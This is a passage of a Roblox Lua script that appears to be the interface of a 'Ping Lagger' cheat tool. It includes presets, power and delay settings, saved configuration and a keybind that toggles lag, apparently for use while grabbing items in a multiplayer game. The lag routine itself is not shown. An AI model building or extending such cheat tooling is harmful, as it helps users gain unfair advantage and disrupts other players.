maxDelayBox.ZIndex = 22
maxDelayBox.Parent = sBody
corner(maxDelayBox, 8)
stroke(maxDelayBox, COLOR_ACCENT, 1.2, 0.3)

----------------------------------------------------------------
-- Preset clicks
----------------------------------------------------------------
for name, data in pairs(presetBtns) do
    data.btn.MouseButton1Click:Connect(function()
        Config.preset = name
        Config.power = PRESETS[name]
        if Config.active then startLag() end
        powerBox.Text = tostring(Config.power)
        powerInfo.Text = "→ " .. formatPower(Config.power)
        refreshPresets()
        saveConfig()
    end)
end

----------------------------------------------------------------
-- Open / close settings (panel aparte)
----------------------------------------------------------------
local settingsOpen = false

local function setSettingsOpen(open)
    settingsOpen = open
    if open then
        -- al lado del main la primera vez
        if Config.setOX == 220 and Config.setSX == 0.18 then
            settingsPanel.Position = UDim2.new(
                panel.Position.X.Scale, panel.Position.X.Offset + 212,
                panel.Position.Y.Scale, panel.Position.Y.Offset
            )
        end
        settingsPanel.Visible = true
        settingsPanel.Size = UDim2.fromOffset(210, 20)
        tween(settingsPanel, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(210, 300)
        })
        powerBox.Text = tostring(Config.power)
        powerInfo.Text = "→ " .. formatPower(Config.power)
        delayBox.Text = tostring(Config.delay)
        minDelayBox.Text = tostring(Config.minDelay)
        maxDelayBox.Text = tostring(Config.maxDelay)
        refreshPresets()
        applyBrainVisual(Config.autoBrain)
    else
        local t = tween(settingsPanel, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.fromOffset(210, 20)
        })
        t.Completed:Connect(function()
            if not settingsOpen then settingsPanel.Visible = false end
        end)
    end
end

settingsBtn.MouseButton1Click:Connect(function()
    setSettingsOpen(not settingsOpen)
end)
closeBtn.MouseButton1Click:Connect(function()
    setSettingsOpen(false)
end)

----------------------------------------------------------------
-- Settings inputs
----------------------------------------------------------------
powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text) or Config.power
    Config.power = math.clamp(math.floor(n), 1, 999999)
    Config.preset = "CUSTOM"
    powerInfo.Text = "→ " .. formatPower(Config.power)
    if Config.active then startLag() end
    refreshPresets()
    saveConfig()
end)

delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text) or Config.delay
    Config.delay = math.clamp(n, 0.03, 1)
    currentWait = Config.delay
    saveConfig()
end)

minDelayBox.FocusLost:Connect(function()
    local n = tonumber(minDelayBox.Text) or Config.minDelay
    Config.minDelay = math.clamp(n, 0.02, 0.5)
    saveConfig()
end)

maxDelayBox.FocusLost:Connect(function()
    local n = tonumber(maxDelayBox.Text) or Config.maxDelay
    Config.maxDelay = math.clamp(n, 0.1, 1.5)
    saveConfig()
end)

----------------------------------------------------------------
-- Keybind global
----------------------------------------------------------------
UserInputService.InputBegan:Connect(function(input, gp)
    if capturing then
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
            Config.keybind = input.KeyCode
            capturing = false
            keyBtn.Text = "KEY [" .. Config.keybind.Name .. "]"
            keyBtn.TextColor3 = COLOR_TEXT
            saveConfig()
        end
        return
    end
    -- Solo ignorar si estás escribiendo en un TextBox; funciona aunque agarres brainrot (gp = true)
    if UserInputService:GetFocusedTextBox() then return end
    if input.KeyCode == Config.keybind then
        toggleLag()
        applyToggleVisual(Config.active)
    end
end)

----------------------------------------------------------------
-- Init
----------------------------------------------------------------
applyToggleVisual(Config.active)
refreshLock()
refreshPresets()
applyBrainVisual(Config.autoBrain)

print("[STICK] Ping Lagger loaded.")